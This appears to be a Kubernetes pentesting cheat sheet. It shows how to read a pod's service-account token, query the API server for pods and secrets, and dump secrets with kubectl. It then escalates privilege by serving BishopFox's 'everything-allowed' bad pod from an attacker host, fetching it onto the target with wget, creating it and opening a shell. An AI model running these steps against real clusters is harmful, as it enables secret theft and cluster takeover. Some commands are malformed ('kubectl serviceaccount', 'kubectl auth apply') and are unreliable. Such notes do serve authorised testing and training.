---
title: Kubernetes Pentesting
description: A portable, extensible, open source platform for managing containerized workloads and services, that facilitates both declarative configuration and automation. Default ports are 6443, 8443.
tags:
    - Container
draft: false
---

## Fetch Information from Kubernetes API Server

First off, find a token by observing the specific directory in the target system.

```sh
cat /var/run/secrets/kubernetes.io/serviceaccount/token
```

If you found a JWT token, decode it using a tool such as [JWT.io](https://jwt.io/).  
Then fetch information by executing the following commands.

```sh
# -k: insecure (HTTPS)
curl -k -v -H "Authorization: Bearer <jwt-token>" https://<target-ip>:<target-port>/api/v1/namespaces/default/pods/
curl -k -v -H "Authorization: Bearer <jwt-token>" https://<target-ip>:<target-port>/api/v1/namespaces/default/secrets/
```

<br />

## Interact with Kubernetes API Server

1. **Create a Service Account**

    ```sh
    # Create a ServiceAccount
    kubectl serviceaccount api-explorer
    # Bind the ClusterRole to the ServiceAccount
    # eg. namespace: default
    kubectl create rolebinding api-explorer:log-reader --clusterrole log-reader --serviceaccount default:api-explorer 
    ```

2. **Check Your Permission**

    ```sh
    kubectl auth can-i --list
    # /var/run/secrets/kubernetes.io/serviceaccount/token
    kubectl auth can-i --list --token=<JWT>
    ```

3. **List All Pods**

    ```sh
    kubectl get pods
    ```

4. **List All Secrets**

    ```sh
    kubectl get secrets

    # Get the specific secret
    kubectl get secret <secret-name>
    # Get the specific secret to output json
    kubectl get secret <secret-name> -o 'json'

    # List all data contained in the specific secret
    kubectl describe secret <secret-name>
    ```

5. **Get the Token (JWT) of the Service Account Running a Pod**

    ```sh
    cat /var/run/secrets/kubernetes.io/serviceaccount/token
    ```

<br />

## Privilege Escalation using Bad Pods

Reference: [everything-allowed-exec-pod.yaml](https://github.com/BishopFox/badPods/blob/main/manifests/everything-allowed/pod/everything-allowed-exec-pod.yaml)

1. **Download the Bad Pod**

    At first, you need to download the bad pod on your local machine.

    ```sh
    wget https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/everything-allowed/pod/everything-allowed-exec-pod.yaml -O privesc.yaml
    ```

    Then start web server to allow the target machine to get this bad pod.

    ```sh
    python3 -m http.server 8000
    ```

3. **Trasfer the Bad Pod to the Target Machine**

    On the target machine, download the bad pod from your local machine.

    ```sh
    wget http://<your-local-ip>:8000/privesc.yaml
    ```

4. **Create the Pod**

    ```sh
    # Create the pod
    kubectl auth apply -f privesc.yaml --token=<JWT>
    
    # List all pods
    kubectl get pods --token=<JWT>
    ```

5. **Get a Shell**

    ```sh
    kubectl exec -it everything-allowed-exec-pod --token=<JWT> -- /bin/bash
    ```
